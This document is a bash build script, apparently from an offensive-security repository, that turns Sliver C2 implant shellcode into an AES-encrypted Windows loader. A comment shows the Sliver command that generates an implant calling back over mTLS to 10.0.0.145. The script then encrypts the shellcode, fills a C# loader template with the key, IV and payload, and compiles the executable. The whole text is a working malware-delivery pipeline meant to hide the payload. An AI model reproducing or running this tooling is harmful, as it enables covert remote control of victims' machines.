#!/bin/bash

## test script 2 to use sliver shellcode directly without donut 

## lhost and lport are not in use for this script
lhost="10.0.0.145"
lport="8888"
arch="x64"
c2type="sliver"

echo 'lhost: '$lhost
echo 'lport: '$lport
echo 'arch:  '$arch
echo 'c2type:'$c2type

mkdir tmp
mkdir output

### To Generate a Sliver implant shellcode without obfuscation:
# [server] sliver > generate -N Sliver2 --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
# [*] Generating new windows/amd64 implant binary
# [!] Symbol obfuscation is disabled
# [*] Build completed in 00:01:25
# [*] Implant saved to /root/Codes/c2loader/input/sliver2.bin
#
### Move the sliver2.bin to folder input if required, then run the autogen script.

rawscfilename='sliver2.bin'
rawscfilename_enc=$rawscfilename'.enc'


sleep 2

cp aesloader2_template.txt tmp/aesloadermono_sliver.cs

mono-csc -out:encryptor.exe -platform:x64 encryptor.cs

mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output2.txt

encpayload=$(cat tmp/enc_output2.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output2.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output2.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output2.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/aesloadermono_sliver.cs
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/aesloadermono_sliver.cs
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/aesloadermono_sliver.cs
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/aesloadermono_sliver.cs
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/aesloadermono_sliver.cs
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/aesloadermono_sliver.cs
sed -i '' -f /dev/stdin tmp/aesloadermono_sliver.cs << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

if [ $arch = 'x64' ]
then
    mono-csc -out:output/aesloadermono_sliver_x64.exe -platform:x64 -unsafe tmp/aesloadermono_sliver.cs
fi

if [ $arch = 'x86' ]
then
    mono-csc -out:output/aesloadermono_sliver_x86.exe -platform:x86 -unsafe tmp/aesloadermono_sliver.cs
fi